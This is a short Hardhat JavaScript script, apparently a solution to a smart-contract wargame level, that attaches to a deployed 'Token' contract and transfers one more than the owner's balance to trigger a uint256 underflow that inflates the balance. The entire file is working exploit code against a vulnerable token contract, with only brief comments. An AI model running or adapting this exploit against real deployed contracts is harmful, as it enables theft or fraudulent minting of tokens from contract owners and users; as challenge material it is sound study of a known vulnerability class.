const hre = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  const TokenContract = await hre.ethers.getContractFactory("Token");
  // attach your instance address
  const Instance = "0x90fa56C9FCE2E5147c5Ed5c75d7d2CAB4395E736";
  const Token = TokenContract.attach(Instance);
  const balance = await Token.balanceOf(owner.address);
  // It will cause the uint256 overflow -> which result in Increased Balance
  const tx = await Token.transfer(otherAccount.address, parseInt(balance) + 1);
  await tx.wait(1);
  const newBalance = await Token.balanceOf(owner.address);
  console.log(balance, newBalance);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
